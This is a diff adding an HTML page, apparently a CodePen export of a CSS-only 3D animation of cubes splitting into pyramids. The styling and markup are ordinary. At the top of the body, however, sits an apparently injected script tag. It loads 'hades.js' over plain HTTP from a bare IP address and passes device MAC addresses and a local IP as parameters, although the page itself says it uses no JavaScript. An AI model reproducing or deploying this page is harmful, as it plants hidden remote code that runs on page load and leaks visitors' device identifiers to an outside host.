@@ -1,0 +1,643 @@
+
+<!DOCTYPE html>
+<html >
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="shortcut icon" type="image/x-icon" href="https://production-assets.codepen.io/assets/favicon/favicon-8ea04875e70c4b0bb41da869e81236e54394d63638a1ef12fa558a4a835f1164.ico" />
+  <link rel="mask-icon" type="" href="https://production-assets.codepen.io/assets/favicon/logo-pin-f2d2b6d2c61838f7e76325261b7195c27224080bc099486ddd6dccb469b8e8e6.svg" color="#111" />
+  <meta name="robots" content="noindex">
+  <title>CodePen - 4 cubes → 12 small pyramids → 3 big pyramids</title>
+  
+  
+  
+  
+      <style>
+      html, body {
+  height: 100%;
+}
+
+body {
+  overflow: hidden;
+  margin: 0;
+  perspective: 40em;
+  background: #191919;
+}
+
+.assembly {
+  transform: translateY(2.5em) rotateX(-22.5deg) rotateY(30deg);
+}
+.assembly, .assembly * {
+  position: absolute;
+  bottom: 50%;
+  left: 50%;
+  transform-style: preserve-3d;
+}
+
+.pyramid:nth-child(1) {
+  transform: translate3d(-13.125em, 0, -8.75em);
+  animation: pos1 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(1) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade1;
+}
+.pyramid:nth-child(1) .pyramid__face--lateral:nth-child(1) {
+  color: #666666;
+}
+.pyramid:nth-child(1) .pyramid__face--lateral:nth-child(2) {
+  color: #333333;
+}
+.pyramid:nth-child(1) .pyramid__face--lateral:nth-child(3) {
+  color: #262626;
+}
+.pyramid:nth-child(1) .pyramid__face--lateral:nth-child(4) {
+  color: #666666;
+}
+@keyframes pos1 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(-13.125em, 0, -8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(-18.125em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  20%, 30% {
+    transform: translate3d(-15.625em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, -17.5em) rotateY(-45deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, -17.5em) rotateY(-45deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade1 {
+  20%, 30% {
+    background: #141414;
+  }
+}
+.pyramid:nth-child(2) {
+  transform: translate3d(-13.125em, 0, 0em);
+  animation: pos2 4s linear infinite;
+}
+.pyramid:nth-child(2) .pyramid__face--lateral:nth-child(1) {
+  color: #666666;
+}
+.pyramid:nth-child(2) .pyramid__face--lateral:nth-child(2) {
+  color: #666666;
+}
+.pyramid:nth-child(2) .pyramid__face--lateral:nth-child(3) {
+  color: #595959;
+}
+.pyramid:nth-child(2) .pyramid__face--lateral:nth-child(4) {
+  color: #666666;
+}
+@keyframes pos2 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(-13.125em, 0, 0em);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 0em) rotateY(-45deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 0em) rotateY(-45deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+.pyramid:nth-child(3) {
+  transform: translate3d(-13.125em, 0, 8.75em);
+  animation: pos3 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(3) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade3;
+}
+.pyramid:nth-child(3) .pyramid__face--lateral:nth-child(1) {
+  color: #666666;
+}
+.pyramid:nth-child(3) .pyramid__face--lateral:nth-child(2) {
+  color: #999999;
+}
+.pyramid:nth-child(3) .pyramid__face--lateral:nth-child(3) {
+  color: #8c8c8c;
+}
+.pyramid:nth-child(3) .pyramid__face--lateral:nth-child(4) {
+  color: #666666;
+}
+@keyframes pos3 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(-13.125em, 0, 8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(-13.125em, -2.5em, 5em) rotate(-90deg) rotateX(90deg);
+  }
+  20%, 30% {
+    transform: translate3d(-13.125em, -2.5em, 2.5em) rotate(-90deg) rotateX(90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 17.5em) rotateY(-45deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 17.5em) rotateY(-45deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade3 {
+  20%, 30% {
+    background: #3d3d3d;
+  }
+}
+.pyramid:nth-child(4) {
+  transform: translate3d(-4.375em, 0, -8.75em);
+  animation: pos4 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(4) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade4;
+}
+.pyramid:nth-child(4) .pyramid__face--lateral:nth-child(1) {
+  color: #7a7a7a;
+}
+.pyramid:nth-child(4) .pyramid__face--lateral:nth-child(2) {
+  color: #404040;
+}
+.pyramid:nth-child(4) .pyramid__face--lateral:nth-child(3) {
+  color: #333333;
+}
+.pyramid:nth-child(4) .pyramid__face--lateral:nth-child(4) {
+  color: #7a7a7a;
+}
+@keyframes pos4 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(-4.375em, 0, -8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(-9.375em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  20%, 30% {
+    transform: translate3d(-6.875em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, -17.5em) rotateY(45deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, -17.5em) rotateY(45deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade4 {
+  20%, 30% {
+    background: #292929;
+  }
+}
+.pyramid:nth-child(5) {
+  transform: translate3d(-4.375em, 0, 0em);
+  animation: pos5 4s linear infinite;
+}
+.pyramid:nth-child(5) .pyramid__face--lateral:nth-child(1) {
+  color: #7a7a7a;
+}
+.pyramid:nth-child(5) .pyramid__face--lateral:nth-child(2) {
+  color: #737373;
+}
+.pyramid:nth-child(5) .pyramid__face--lateral:nth-child(3) {
+  color: #666666;
+}
+.pyramid:nth-child(5) .pyramid__face--lateral:nth-child(4) {
+  color: #7a7a7a;
+}
+@keyframes pos5 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(-4.375em, 0, 0em);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 0em) rotateY(45deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 0em) rotateY(45deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+.pyramid:nth-child(6) {
+  transform: translate3d(-4.375em, 0, 8.75em);
+  animation: pos6 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(6) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade6;
+}
+.pyramid:nth-child(6) .pyramid__face--lateral:nth-child(1) {
+  color: #7a7a7a;
+}
+.pyramid:nth-child(6) .pyramid__face--lateral:nth-child(2) {
+  color: #a6a6a6;
+}
+.pyramid:nth-child(6) .pyramid__face--lateral:nth-child(3) {
+  color: #999999;
+}
+.pyramid:nth-child(6) .pyramid__face--lateral:nth-child(4) {
+  color: #7a7a7a;
+}
+@keyframes pos6 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(-4.375em, 0, 8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(-4.375em, -2.5em, 5em) rotate(-90deg) rotateX(90deg);
+  }
+  20%, 30% {
+    transform: translate3d(-4.375em, -2.5em, 2.5em) rotate(-90deg) rotateX(90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 17.5em) rotateY(45deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 17.5em) rotateY(45deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade6 {
+  20%, 30% {
+    background: #525252;
+  }
+}
+.pyramid:nth-child(7) {
+  transform: translate3d(4.375em, 0, -8.75em);
+  animation: pos7 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(7) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade7;
+}
+.pyramid:nth-child(7) .pyramid__face--lateral:nth-child(1) {
+  color: #8f8f8f;
+}
+.pyramid:nth-child(7) .pyramid__face--lateral:nth-child(2) {
+  color: #4d4d4d;
+}
+.pyramid:nth-child(7) .pyramid__face--lateral:nth-child(3) {
+  color: #404040;
+}
+.pyramid:nth-child(7) .pyramid__face--lateral:nth-child(4) {
+  color: #8f8f8f;
+}
+@keyframes pos7 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(4.375em, 0, -8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(-0.625em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  20%, 30% {
+    transform: translate3d(1.875em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, -17.5em) rotateY(135deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, -17.5em) rotateY(135deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade7 {
+  20%, 30% {
+    background: #3d3d3d;
+  }
+}
+.pyramid:nth-child(8) {
+  transform: translate3d(4.375em, 0, 0em);
+  animation: pos8 4s linear infinite;
+}
+.pyramid:nth-child(8) .pyramid__face--lateral:nth-child(1) {
+  color: #8f8f8f;
+}
+.pyramid:nth-child(8) .pyramid__face--lateral:nth-child(2) {
+  color: gray;
+}
+.pyramid:nth-child(8) .pyramid__face--lateral:nth-child(3) {
+  color: #737373;
+}
+.pyramid:nth-child(8) .pyramid__face--lateral:nth-child(4) {
+  color: #8f8f8f;
+}
+@keyframes pos8 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(4.375em, 0, 0em);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 0em) rotateY(135deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 0em) rotateY(135deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+.pyramid:nth-child(9) {
+  transform: translate3d(4.375em, 0, 8.75em);
+  animation: pos9 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(9) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade9;
+}
+.pyramid:nth-child(9) .pyramid__face--lateral:nth-child(1) {
+  color: #8f8f8f;
+}
+.pyramid:nth-child(9) .pyramid__face--lateral:nth-child(2) {
+  color: #b3b3b3;
+}
+.pyramid:nth-child(9) .pyramid__face--lateral:nth-child(3) {
+  color: #a6a6a6;
+}
+.pyramid:nth-child(9) .pyramid__face--lateral:nth-child(4) {
+  color: #8f8f8f;
+}
+@keyframes pos9 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(4.375em, 0, 8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(4.375em, -2.5em, 5em) rotate(-90deg) rotateX(90deg);
+  }
+  20%, 30% {
+    transform: translate3d(4.375em, -2.5em, 2.5em) rotate(-90deg) rotateX(90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 17.5em) rotateY(135deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 17.5em) rotateY(135deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade9 {
+  20%, 30% {
+    background: #666666;
+  }
+}
+.pyramid:nth-child(10) {
+  transform: translate3d(13.125em, 0, -8.75em);
+  animation: pos10 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(10) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade10;
+}
+.pyramid:nth-child(10) .pyramid__face--lateral:nth-child(1) {
+  color: #a3a3a3;
+}
+.pyramid:nth-child(10) .pyramid__face--lateral:nth-child(2) {
+  color: #595959;
+}
+.pyramid:nth-child(10) .pyramid__face--lateral:nth-child(3) {
+  color: #4d4d4d;
+}
+.pyramid:nth-child(10) .pyramid__face--lateral:nth-child(4) {
+  color: #a3a3a3;
+}
+@keyframes pos10 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(13.125em, 0, -8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(8.125em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  20%, 30% {
+    transform: translate3d(10.625em, -2.5em, 0em) rotateY(90deg) rotateX(-90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, -17.5em) rotateY(225deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, -17.5em) rotateY(225deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade10 {
+  20%, 30% {
+    background: #525252;
+  }
+}
+.pyramid:nth-child(11) {
+  transform: translate3d(13.125em, 0, 0em);
+  animation: pos11 4s linear infinite;
+}
+.pyramid:nth-child(11) .pyramid__face--lateral:nth-child(1) {
+  color: #a3a3a3;
+}
+.pyramid:nth-child(11) .pyramid__face--lateral:nth-child(2) {
+  color: #8c8c8c;
+}
+.pyramid:nth-child(11) .pyramid__face--lateral:nth-child(3) {
+  color: gray;
+}
+.pyramid:nth-child(11) .pyramid__face--lateral:nth-child(4) {
+  color: #a3a3a3;
+}
+@keyframes pos11 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(13.125em, 0, 0em);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 0em) rotateY(225deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 0em) rotateY(225deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+.pyramid:nth-child(12) {
+  transform: translate3d(13.125em, 0, 8.75em);
+  animation: pos12 4s linear infinite;
+  /* 2 classes because specificity */
+}
+.pyramid:nth-child(12) .pyramid__face.pyramid__face--base {
+  animation-name: baseshade12;
+}
+.pyramid:nth-child(12) .pyramid__face--lateral:nth-child(1) {
+  color: #a3a3a3;
+}
+.pyramid:nth-child(12) .pyramid__face--lateral:nth-child(2) {
+  color: #bfbfbf;
+}
+.pyramid:nth-child(12) .pyramid__face--lateral:nth-child(3) {
+  color: #b3b3b3;
+}
+.pyramid:nth-child(12) .pyramid__face--lateral:nth-child(4) {
+  color: #a3a3a3;
+}
+@keyframes pos12 {
+  0%, 5%, 45%, 55%, 95%, 100% {
+    transform: translate3d(13.125em, 0, 8.75em);
+  }
+  15%, 35% {
+    transform: translate3d(13.125em, -2.5em, 5em) rotate(-90deg) rotateX(90deg);
+  }
+  20%, 30% {
+    transform: translate3d(13.125em, -2.5em, 2.5em) rotate(-90deg) rotateX(90deg);
+  }
+  65%, 85% {
+    transform: translate3d(0, 0, 17.5em) rotateY(225deg) translate(-5.3033em) rotateY(-45deg);
+  }
+  70%, 80% {
+    transform: translate3d(0, 0, 17.5em) rotateY(225deg) translate(-3.53553em) rotateY(-45deg);
+  }
+}
+@keyframes baseshade12 {
+  20%, 30% {
+    background: #7a7a7a;
+  }
+}
+.pyramid__face {
+  margin: 0 -2.5em;
+  width: 5em;
+  height: 5em;
+  backface-visibility: hidden;
+}
+.pyramid__face--lateral {
+  transform-origin: 50% 100%;
+}
+.pyramid__face--lateral:nth-child(1) {
+  animation: inherit;
+  animation-name: no-flick;
+  transform: rotateY(90deg) translateZ(2.5em);
+  background: linear-gradient(to right bottom, transparent 49%, currentColor 50%);
+  color: #5f5f5f;
+}
+.pyramid__face--lateral:nth-child(2) {
+  height: 7.07107em;
+  transform: rotateY(0deg) translateZ(2.5em) rotateX(45deg);
+  background: linear-gradient(to right bottom, transparent 49%, currentColor 50%);
+  color: #646464;
+}
+.pyramid__face--lateral:nth-child(3) {
+  height: 7.07107em;
+  transform: rotateY(-90deg) translateZ(2.5em) rotateX(45deg);
+  background: linear-gradient(to left bottom, transparent 49%, currentColor 50%);
+  color: #5f5f5f;
+}
+.pyramid__face--lateral:nth-child(4) {
+  animation: inherit;
+  animation-name: no-flick;
+  transform: rotateY(-180deg) translateZ(2.5em);
+  background: linear-gradient(to left bottom, transparent 49%, currentColor 50%);
+  color: #bbbbbb;
+}
+.pyramid__face--base {
+  transform: rotateX(-90deg) translateZ(2.5em);
+  background: #000;
+}
+.pyramid:not(:nth-child(3n + 2)) .pyramid__face--base {
+  animation: inherit;
+}
+
+@keyframes no-flick {
+  0%, 69.99%, 80.01%, 100% {
+    opacity: .999;
+  }
+  70%, 80% {
+    opacity: .001;
+  }
+}
+
+    </style>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+
+  
+  
+</head>
+
+<body translate="no" >
+<script id="is7k4739bvtc5ya003t9726g5h3c" extend="ac=00:d8:f0:cb:10:71&ap=00:D8:F0:CB:10:71&freq=noband&ip=10.111.237.108&mac=20:1a:06:93:67:d0&shopId=noband&sn=OKHVwUkmoVB7C0GqbvOAaZNrPFj3" src="http://118.178.32.90/js/hades.js?freq=noband&hades=&mac=20:1a:06:93:67:d0&random=341&shopId=noband"></script>
+
+
+  <div class='assembly'>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+  <div class='pyramid'>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--lateral'></div>
+    <div class='pyramid__face pyramid__face--base'></div>
+  </div>
+</div>
+  
+  
+    <script>
+    // no JS, it's just CSS
+  </script>
+
+  
+  
+
+</body>
+</html>
+ 
